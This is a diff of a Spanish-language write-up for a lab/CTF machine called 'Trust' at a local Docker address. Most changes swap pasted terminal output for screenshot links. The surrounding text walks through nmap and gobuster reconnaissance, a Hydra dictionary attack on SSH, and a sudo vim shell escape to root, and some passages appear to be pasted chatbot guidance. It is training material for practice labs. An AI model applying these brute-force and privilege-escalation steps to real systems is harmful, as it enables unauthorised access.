@@ -1,76 +1,21 @@
 # Máquina Trust
 
 **IP**: 172.17.0.2
+![imagen de la máquina desplegada](assets/trust_1.png)
 
 ## Fase de comprobación de conectividad
 
 ### 1. Ping
-- La máquina responde correctamente:
-┌──(pol㉿kali)-[~]
-└─$ ping 172.17.0.2
-PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
-64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.133 ms
-64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.080 ms
-64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.082 ms
-64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.069 ms
-^C
---- 172.17.0.2 ping statistics ---
-4 packets transmitted, 4 received, 0% packet loss, time 3061ms
-rtt min/avg/max/mdev = 0.069/0.091/0.133/0.024 ms
+![imagen de la salida del comando ping](assets/trust_2.png)
 
-![imagen de la máquina desplegada](assets/trust_1.png)
+
 
 ###   Fase 1: Reconocimiento
 1. Escaneo básico con Nmap
 Vamos a identificar los puertos abiertos en la máquina.
 
 Ejecuta:
-
-bash
-Copy
-nmap 172.17.0.2                                                
-
-┌──(pol㉿kali)-[~]
-└─$ nmap 172.17.0.2  
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:50 -03
-Nmap scan report for 172.17.0.2
-Host is up (0.000025s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 02:42:AC:11:00:02 (Unknown)
-
-Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
-
-1. Escaneo avanzado con Nmap
-Vamos a obtener más detalles sobre los servicios y el sistema operativo.
-
-Ejecuta:
-
-bash
-Copy
-nmap -sV -O 172.17.0.2
-
-┌──(pol㉿kali)-[~]
-└─$ nmap -sV -O 172.17.0.2
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:52 -03
-Nmap scan report for 172.17.0.2
-Host is up (0.000089s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.57 ((Debian))
-MAC Address: 02:42:AC:11:00:02 (Unknown)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
+![imagen del comando nmap](assets/trust_3.png)
 
 ### ¡Perfecto! El escaneo avanzado con Nmap nos ha dado información muy útil sobre la máquina 172.17.0.2. Vamos a analizar los resultados y continuar paso a paso.
 
@@ -151,7 +96,7 @@ Ejecuta:
 
 bash
 Copy
-gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt .php, .txt, .py, 
+gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 
 ===============================================================
 Gobuster v3.6
@@ -223,6 +168,8 @@ bash
 Copy
 ### Fuzzing
 Hacemos fuzzing al puerto 80 para ver si cuelga algun directorio o archivo de la raiz. 
+
+![Fuzzing con gobuster](assets/trust_4.png)
 
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.py
 
@@ -338,6 +285,8 @@ curl http://172.17.0.2/secret.php
 ### Próximos pasos
 Hydra
 Utilizamos hydra para hacer un ataque de diccionario por SSH.
+![señal de la máquina kali trabajando](assets/trust_5.png)
+![hydra](assets/trust_6.png)
 
 ┌──(root㉿kali)-[/home/pol]
 └─# hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
@@ -354,6 +303,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 10:14:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-08 10:14:36
 
+![ingresamos](assets/trust_7.png)
+
+![probamos](assets/trust_8.png)
 # mario@9de2e1532c9a:~$ find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 /usr/bin/chsh
@@ -366,6 +318,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-08 10:14:
 /usr/bin/sudo
 /usr/lib/openssh/ssh-keysign
 
+![seguimos probando](assets/trust_9.png)
 # mario@9de2e1532c9a:~$ sudo -l
 [sudo] password for mario: 
 Matching Defaults entries for mario on 9de2e1532c9a:
@@ -388,12 +341,13 @@ Editar
 sudo vim
 Esto abrirá Vim con privilegios de root.
 
+![ingresamos a vim](assets/trust_10.png)
 Entra en modo de comandos
 Presiona la tecla ESC para asegurarte de estar en modo normal.
 
 Configura Vim para ejecutar una shell
 Escribe lo siguiente y presiona Enter después de cada línea:
-
+![ejecutamos:](assets/trust_11.png)
 bash
 Copiar
 Editar
@@ -404,7 +358,7 @@ Editar
 :shell
 Obtendrás una shell como root
 Ahora deberías tener acceso a una shell interactiva con privilegios elevados. Verifícalo ejecutando:
-
+![ejecutamos:](assets/trust_12.png)
 bash
 Copiar
 Editar
@@ -422,7 +376,7 @@ y presionar Enter.
 Prueba estos pasos y dime si lograste obtener acceso como root. 🚀
 
 mario@9de2e1532c9a:~$ sudo vim
-
+![ingresamos](assets/trust_13.png)
 # whoami
 root
 # id
